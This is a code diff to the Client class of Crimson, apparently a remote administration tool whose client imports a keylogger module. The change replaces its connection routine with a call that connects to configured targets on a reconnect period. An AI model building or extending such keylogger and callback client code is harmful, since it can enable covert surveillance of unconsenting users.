@@ -28,13 +28,16 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
-import com.subterranean_security.crimson.client.net.ClientConnectionStore;
+import com.subterranean_security.crimson.client.net.ClientExecutor;
 import com.subterranean_security.crimson.client.store.ConfigStore;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.EH;
+import com.subterranean_security.crimson.core.net.factory.ExecutorFactory;
+import com.subterranean_security.crimson.core.net.thread.ConnectionPeriod;
 import com.subterranean_security.crimson.core.platform.Environment;
 import com.subterranean_security.crimson.core.storage.BasicDatabase;
 import com.subterranean_security.crimson.core.storage.BasicStorageFacility;
+import com.subterranean_security.crimson.core.store.ConnectionStore;
 import com.subterranean_security.crimson.core.store.LcvidStore;
 import com.subterranean_security.crimson.core.util.LogUtil;
 import com.subterranean_security.crimson.core.util.Native;
@@ -105,8 +108,14 @@ public class Client {
 			}
 		}
 
-		ClientConnectionStore.setTargets(ConfigStore.getConfig().getTargetList());
-		ClientConnectionStore.connectionRoutine();
+		try {
+			ConnectionStore.connect(new ExecutorFactory(ClientExecutor.class), ConfigStore.getConfig().getTargetList(),
+					new ConnectionPeriod(ConfigStore.getConfig().getReconnectPeriod()), 0,
+					ConfigStore.getConfig().getForceCertificates());
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 
 	}
 
